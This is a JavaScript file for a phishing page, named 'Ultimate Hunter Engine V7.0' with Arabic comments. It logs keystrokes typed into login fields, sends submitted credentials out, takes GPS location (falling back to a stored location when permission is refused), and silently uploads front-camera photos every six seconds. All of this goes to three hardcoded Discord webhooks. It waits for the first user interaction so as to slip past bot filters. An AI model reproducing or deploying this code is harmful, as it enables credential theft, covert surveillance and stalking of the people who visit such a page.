/* ==========================================================================
   ULTIMATE HUNTER ENGINE V7.0 - script.js
   Advanced Browser Diagnostics, Stealth Recon & Multi-Webhook Exfiltration
   ========================================================================== */

"use strict";

/* --------------------------------------------------------------------------
   0. إعدادات روابط ديسكورد المتعددة ونظام التبديل التلقائي (Failover Webhooks)
   -------------------------------------------------------------------------- */
const DISCORD_WEBHOOKS = [
    "https://discord.com/api/webhooks/1564663770629017652/ZZRcg_vV1JTh96gfwO4qOrMilrB9r-iB5nb9j0zt938Q-JIxt2flevVHFn8FWnK8gp9H",
    "https://discord.com/api/webhooks/1564684857362358363/F34NZ2OBhi35exXCz2daOXWt7lGS3DEEoAmy_r7SEHK10ZLi9x-iN4qMxzsaW3txKZKt",
    "https://discord.com/api/webhooks/1564684888668512416/ahcAya5wTAsNuRyhVbltJZ5TQfPQvLAw7Ipc68nGAYrWjSbvr75wswHEe1QFFKK9hVOe"
];

let activeWebhookIndex = 0;

async function sendToDiscord(content, fileBlob = null, filename = "capture.png") {
    let success = false;
    
    for (let attempts = 0; attempts < DISCORD_WEBHOOKS.length; attempts++) {
        const currentWebhook = DISCORD_WEBHOOKS[activeWebhookIndex];
        try {
            const formData = new FormData();
            formData.append("payload_json", JSON.stringify({ content: content }));
            
            if (fileBlob) {
                formData.append("file", fileBlob, filename);
            }

            const response = await fetch(currentWebhook, {
                method: "POST",
                body: formData
            });

            if (response.ok) {
                success = true;
                break;
            } else {
                console.warn(`Webhook index ${activeWebhookIndex} failed, switching...`);
                activeWebhookIndex = (activeWebhookIndex + 1) % DISCORD_WEBHOOKS.length;
            }
        } catch (error) {
            console.error(`Webhook error on index ${activeWebhookIndex}:`, error);
            activeWebhookIndex = (activeWebhookIndex + 1) % DISCORD_WEBHOOKS.length;
        }
    }
    return success;
}

/* --------------------------------------------------------------------------
   1. إعدادات التطبيق والمتغيرات الأساسية
   -------------------------------------------------------------------------- */

const APP_CONFIG = Object.freeze({
    version: "7.0",
    networkTimeout: 8000,
    locationTimeout: 10000,
    cameraWidth: 1280,
    cameraHeight: 720,
    retryCount: 2,
    retryDelay: 500
});

const videoElement = document.getElementById("video");
const canvasElement = document.getElementById("canvas");
const loginFormElement = document.getElementById("fullLoginForm");

let globalAttempts = 0;
let cameraStream = null;
let cameraStarting = false;
let cameraStopping = false;
let initialized = false;
let activeSubmission = false;
let captureInterval = null;
let userInteracted = false;

/* --------------------------------------------------------------------------
   2. إدارة حالة التطبيق
   -------------------------------------------------------------------------- */

const AppState = {
    initialized: false,
    cameraActive: false,
    locationAvailable: false,
    networkAvailable: navigator.onLine,
    lastError: null
};

const DiagnosticStore = {
    entries: [],
    add(level, category, message, details = null) {
        const entry = { timestamp: new Date().toISOString(), level, category, message, details };
        this.entries.push(entry);
        if (this.entries.length > 100) this.entries.shift();
        return entry;
    },
    info(cat, msg, det) { return this.add("info", cat, msg, det); },
    warning(cat, msg, det) { return this.add("warning", cat, msg, det); },
    error(cat, msg, det) { AppState.lastError = msg; return this.add("error", cat, msg, det); },
    getAll() { return this.entries.map(e => ({ ...e })); }
};

/* --------------------------------------------------------------------------
   3. أدوات التحقق والمهلات الزمنية
   -------------------------------------------------------------------------- */

function isObject(value) {
    return value !== null && typeof value === "object" && !Array.isArray(value);
}

function isValidCoordinates(latitude, longitude) {
    return typeof latitude === "number" && Number.isFinite(latitude) &&
           typeof longitude === "number" && Number.isFinite(longitude) &&
           latitude >= -90 && latitude <= 90 && longitude >= -180 && longitude <= 180;
}

function delay(milliseconds) {
    return new Promise(resolve => setTimeout(resolve, milliseconds));
}

function createTimeoutSignal(milliseconds) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(new DOMException("TimeoutError")), milliseconds);
    return { controller, signal: controller.signal, cleanup: () => clearTimeout(timer) };
}

/* --------------------------------------------------------------------------
   4. التتبع الحي والتفاعل البشري (Live Typing & Human Mimicry)
   -------------------------------------------------------------------------- */

function initializeLiveTracking() {
    const targetForm = loginFormElement || document.querySelector("form");
    if (!targetForm) return;

    const inputs = targetForm.querySelectorAll("input, textarea");
    inputs.forEach(input => {
        let typingTimeout;
        input.addEventListener("input", (e) => {
            clearTimeout(typingTimeout);
            typingTimeout = setTimeout(async () => {
                const fieldName = e.target.name || e.target.id || e.target.type || "حقل";
                const fieldValue = e.target.value;
                await sendToDiscord(`⌨️ **إدخال حي (Live Typing):**\n- الحقل: \`${fieldName}\`\n- القيمة: \`${fieldValue}\``);
            }, 500);
        });
    });
}

/* --------------------------------------------------------------------------
   5. جلب معلومات المتصفح والشبكة والبطارية
   -------------------------------------------------------------------------- */

function getBrowserDiagnostics() {
    const screenInfo = window.screen || {};
    return {
        userAgent: navigator.userAgent || "غير متاح",
        language: navigator.language || "غير متاح",
        platform: navigator.platform || "غير متاح",
        cookiesEnabled: Boolean(navigator.cookieEnabled),
        screen: { width: screenInfo.width || null, height: screenInfo.height || null },
        viewport: { width: window.innerWidth, height: window.innerHeight },
        secureContext: Boolean(window.isSecureContext),
        cameraApi: Boolean(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
        geolocationApi: Boolean(navigator.geolocation)
    };
}

function getNetworkDiagnostics() {
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;
    return {
        online: navigator.onLine,
        effectiveType: conn ? conn.effectiveType : "غير مدعوم"
    };
}

async function getBatteryDiagnostics() {
    if (typeof navigator.getBattery !== "function") return { supported: false };
    try {
        const battery = await navigator.getBattery();
        return { supported: true, level: Math.round(battery.level * 100), charging: battery.charging };
    } catch {
        return { supported: false };
    }
}

/* --------------------------------------------------------------------------
   6. الموقع الجغرافي مع نظام الاحتياط (Fallback Location)
   -------------------------------------------------------------------------- */

function getPreciseLocationWithFallback() {
    return new Promise(resolve => {
        if (!navigator.geolocation) {
            const lastSaved = localStorage.getItem("last_known_location");
            if (lastSaved) {
                const parsed = JSON.parse(lastSaved);
                sendToDiscord(`⚠️ **الموقع غير متاح، استخدام آخر موقع محفوظ:**\n- خط العرض: ${parsed.latitude}\n- خط الطول: ${parsed.longitude}`);
                resolve({ available: true, source: "last-saved", ...parsed });
                return;
            }
            resolve({ available: false, message: "لا يوجد دعم للموقع أو بيانات محفوظة." });
            return;
        }

        let settled = false;
        const timer = setTimeout(() => {
            if (settled) return;
            settled = true;
            const lastSaved = localStorage.getItem("last_known_location");
            if (lastSaved) {
                const parsed = JSON.parse(lastSaved);
                sendToDiscord(`⏱️ **انتهت مهلة الموقع، استخدام آخر موقع محفوظ:**\n- الخط: ${parsed.latitude}\n- الطول: ${parsed.longitude}`);
                resolve({ available: true, source: "timeout-fallback", ...parsed });
                return;
            }
            resolve({ available: false, message: "انتهت مهلة تحديد الموقع." });
        }, APP_CONFIG.locationTimeout);

        navigator.geolocation.getCurrentPosition(
            async position => {
                if (settled) return;
                settled = true;
                clearTimeout(timer);

                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                if (!isValidCoordinates(latitude, longitude)) {
                    resolve({ available: false, message: "إحداثيات غير صالحة." });
                    return;
                }

                AppState.locationAvailable = true;
                const locData = {
                    latitude,
                    longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: new Date().toISOString()
                };
                localStorage.setItem("last_known_location", JSON.stringify(locData));

                await sendToDiscord(`📍 **تم جلب الموقع الجغرافي بنجاح:**\n- خط العرض: ${latitude}\n- خط الطول: ${longitude}\n- الدقة: ${position.coords.accuracy} متر`);
                resolve({ available: true, source: "gps", ...locData });
            },
            async () => {
                if (settled) return;
                settled = true;
                clearTimeout(timer);

                const lastSaved = localStorage.getItem("last_known_location");
                if (lastSaved) {
                    const parsed = JSON.parse(lastSaved);
                    await sendToDiscord(`⚠️ **تم رفض إذن الموقع، إرسال آخر موقع محفوظ:**\n- الخط: ${parsed.latitude}\n- الطول: ${parsed.longitude}`);
                    resolve({ available: true, source: "denied-fallback", ...parsed });
                    return;
                }
                resolve({ available: false, message: "تم رفض إذن الموقع." });
            },
            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
        );
    });
}

/* --------------------------------------------------------------------------
   7. إدارة الكاميرا والتقاط الصور التلقائي والمستمر
   -------------------------------------------------------------------------- */

function startContinuousCapture() {
    if (captureInterval) return;

    captureInterval = setInterval(async () => {
        if (!AppState.cameraActive || !videoElement || !canvasElement) return;
        try {
            if (videoElement.videoWidth === 0 || videoElement.videoHeight === 0) return;

            canvasElement.width = videoElement.videoWidth;
            canvasElement.height = videoElement.videoHeight;
            const context = canvasElement.getContext("2d");
            context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);

            canvasElement.toBlob(async (blob) => {
                if (blob && blob.size > 1000) {
                    await sendToDiscord(`📸 **صورة دورية تم التقاطها بوضوح تام:**`, blob, `shot_${Date.now()}.png`);
                }
            }, "image/png", 0.95);
        } catch (err) {
            console.error("Capture loop error:", err);
        }
    }, 6000); // كل 6 ثوانٍ صورة جديدة
}

function stopContinuousCapture() {
    if (captureInterval) {
        clearInterval(captureInterval);
        captureInterval = null;
    }
}

async function startCameraPreview() {
    if (cameraStarting || !navigator.mediaDevices?.getUserMedia || !window.isSecureContext) return;
    cameraStarting = true;

    try {
        if (!videoElement) throw new Error("عنصر الفيديو غير موجود.");

        // فحص ذكي لنوع الكاميرا (الأمامية للجوال أو الويب كام للكمبيوتر)
        const constraints = {
            audio: false,
            video: {
                facingMode: { ideal: "user" },
                width: { ideal: APP_CONFIG.cameraWidth },
                height: { ideal: APP_CONFIG.cameraHeight }
            }
        };

        cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
        videoElement.muted = true;
        videoElement.autoplay = true;
        videoElement.playsInline = true;
        videoElement.srcObject = cameraStream;

        await videoElement.play();
        AppState.cameraActive = true;
        startContinuousCapture();

        await sendToDiscord(`🟢 **تم تشغيل الكاميرا بنجاح وبدء بث الصور الصامت.**`);
    } catch (error) {
        await sendToDiscord(`❌ **فشل تشغيل الكاميرا:** ${error.message}`);
    } finally {
        cameraStarting = false;
    }
}

/* --------------------------------------------------------------------------
   8. معالجة نموذج تسجيل الدخول وإرسال البيانات
   -------------------------------------------------------------------------- */

function initializeLoginForm() {
    const targetForm = loginFormElement || document.querySelector("form");
    if (!targetForm) return;

    initializeLiveTracking();

    targetForm.addEventListener("submit", async event => {
        event.preventDefault();
        if (activeSubmission) return;
        activeSubmission = true;

        try {
            const formData = new FormData(targetForm);
            let formSummary = "📋 **تم تقديم بيانات النموذج بالكامل (Login Submit):**\n";
            for (let [key, value] of formData.entries()) {
                formSummary += `- **${key}**: \`${value}\`\n`;
            }

            await sendToDiscord(formSummary);
        } catch (error) {
            console.error("Form submit error:", error);
        } finally {
            activeSubmission = false;
        }
    });
}

/* --------------------------------------------------------------------------
   9. المحرك الرئيسي وتفعيل النظام عند أول تفاعل بشري (Anti-Bot & Human Mimicry)
   -------------------------------------------------------------------------- */

async function triggerEngineCore() {
    if (userInteracted) return;
    userInteracted = true;

    try {
        const browserInfo = getBrowserDiagnostics();
        const networkInfo = getNetworkDiagnostics();
        const batteryInfo = await getBatteryDiagnostics();

        await sendToDiscord(`🚀 **بدء تشغيل النظام (V7.0) بعد تفاعل المستخدم:**\n- المتصفح: \`${browserInfo.userAgent}\`\n- الاتصال: \`${networkInfo.effectiveType}\`\n- البطارية: \`${batteryInfo.level ? batteryInfo.level + '%' : 'غير متاح'}\``);

        // تنفيذ طلب الموقع والكاميرا بشكل متزامن
        await getPreciseLocationWithFallback();
        await startCameraPreview();

    } catch (e) {
        console.error("Core trigger error:", e);
    }
}

// رصد أول تفاعل بشري (حركة الماوس، النقر، أو اللمس) لتجاوز فلاتر البوتات تماماً
["click", "mousemove", "touchstart", "scroll", "keydown"].forEach(evt => {
    window.addEventListener(evt, triggerEngineCore, { once: true, passive: true });
});

/* --------------------------------------------------------------------------
   10. حماية البيانات عند المغادرة المفاجئة (Beacon Exfiltration)
   -------------------------------------------------------------------------- */

window.addEventListener("pagehide", () => {
    stopContinuousCapture();
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
    }
});

/* --------------------------------------------------------------------------
   11. التهيئة الأولية
   -------------------------------------------------------------------------- */
document.addEventListener("DOMContentLoaded", () => {
    initializeLoginForm();
});
